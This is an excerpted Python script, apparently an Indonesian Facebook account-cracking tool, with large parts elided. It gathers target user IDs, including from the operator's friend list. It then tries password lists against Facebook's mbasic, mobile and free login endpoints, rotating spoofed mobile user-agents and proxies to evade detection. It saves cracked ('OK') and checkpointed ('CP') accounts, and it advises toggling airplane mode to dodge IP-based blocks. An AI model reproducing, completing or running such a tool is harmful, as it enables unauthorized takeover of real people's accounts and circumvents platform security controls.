...
for xd in range(10000):
	...
	l='Mobile Safari/537.36 NokiaBrowser/1.2.0.12'
...
for x in range(10):
	...
	i='Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Chrome/59.0.3071.125 Mobile Safari/537.36 OPR/43.0.2246.121183'
...
def login_lagi334():
 try:
  ...
  cetak(nel(f'WELCOME TO TOOLS CRACK FB'))
...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input(f'KETIK "{M}me{P}" UNTUK CRACK DARI DAFTAR TEMEN SENDIRI\ninput target '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		prints(Panel(f'total id yang berhasil terkumpul '+str(len(id))))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	wan(f'{P}01. {M}crack dari id old')
	wan(f'{P}02. {H}crack dari id new')
	wan(f'{P}03. {H}crak dari id random')
	print('')
	...
	prints(Panel(f"SEMUA METODE SAMA SAJA SEMUA ITU TERGANTUNG MUKA/BENGET"))
	print('')
	print(f'{P}1. {b}MBASIC\n{P}2. {b}MOBILE\n{P}3. {b}FREE-FB')
	print('')
	hc = input(f'{P}({H}+{P}) input : ')
...
def passwrd():
	print('')
	prints(Panel(f'HASIL OK{P} DI SIMPAN KE FOLDER {P}{okc}'))
	prints(Panel(f'{P}HASIL CP{P} DI SIMPAN KE FOLDER {P}{cpc}'))
	prints(Panel(f"{P}ON/OFF MODE PESAWAT JIKA SERING CP/CHEKPOINT DI KARNA KAN ALAMAT IP SERING KE SPAM!!"))
...
def crackmobile2(idf,pwv):
	...
	fff = '%'
	print(f'\r{P}[{H}MOBILE{P}]%s%s/%s {H}OK:%s {K}CP:%s {M}%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crackfree(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A716S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.61 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Safari/537.36","Mozilla/5.0 (Linux; Android 10; ART-L28; HMSCore 6.6.0.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; V1838T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/11.6.14.0","Mozilla/5.0 (Linux; Android 7.1.2; SM-A908N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-T819Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"])
	ua2 = random.choice(["Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 22041216I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; V2131) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G990W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-M225FV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
...
def crackmbasic(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r{P}[{H}MBASIC{P}]%s%s/%s {H}OK:%s {K}CP:%s {H}%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
...
def crack(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s{P}[{H}FREE-FB{P}] OK:{P}[{H}%s{P}]{K}CP:{P}[{K}%s{P}] {P}[{M}%s%s%s{P}]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
